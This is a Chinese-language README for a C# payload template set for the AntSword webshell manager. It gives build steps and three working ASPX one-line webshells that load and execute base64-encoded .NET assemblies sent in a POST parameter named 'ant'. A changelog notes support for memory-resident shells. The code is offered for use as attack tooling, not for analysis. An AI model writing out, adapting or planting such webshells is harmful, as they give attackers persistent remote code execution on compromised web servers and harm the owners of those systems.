# AntSword-Csharp-Template v1.2

中国蚁剑Csharp一句话Payload

编译环境：.net 2.0

适用范围：.net 2.0 及以上

类型介绍：http://yzddmr6.com/posts/%E8%81%8A%E8%81%8A%E6%96%B0%E7%B1%BB%E5%9E%8BASPXCSharp/

## 编译

在build.py中替换你的csc路径后运行，即可在`./dist`目录下自动生成代码模板。

```
python3 build.py
```

编译完成后将`./dist/`目录下所有文件拷贝至`antSword-master/source/core/aspxcsharp/template/`下即可

## Shell

### shell.aspx

为了兼容各种情况下的内存马，Equals中的入口参数可以为System.Web.HttpContext对象，或者包含Request与Response对象的数组。

即

```
<%@ Page Language="c#"%>
<%
    String Payload = Request.Form["ant"];
    if (Payload != null)
    {
        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
        assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(Context);
    }
%>
```

或者

```
<%@ Page Language="c#"%>
<%
    String Payload = Request.Form["ant"];
    if (Payload != null)
    {
        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
        assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(new object[] { Request, Response });
    }
%>
```

如果数组方式跟Context都无法获取的话，Payload会尝试通过HttpContext.Current来拿到当前的Context。所以其实在shell中直接Equals(null)，或者一个随意对象即可。

```
<%@ Page Language="c#"%>
<%
    String Payload = Request.Form["ant"];
    if (Payload != null)
    {
        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
        assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(null);
    }
%>
```

## 更新日志

### v 1.2

1. Payload采用命名空间格式
2. 更新入口参数方式，去掉兼容性不强的Page方式
3. 修复mssql列名获取错误的问题
4. 修改基本信息中获取根路径的方式，兼容HttpListener内存马

### v 1.1

1. 兼容内存马
2. Payload类名不再固定，采用动态获取方式

### v 1.0

1. release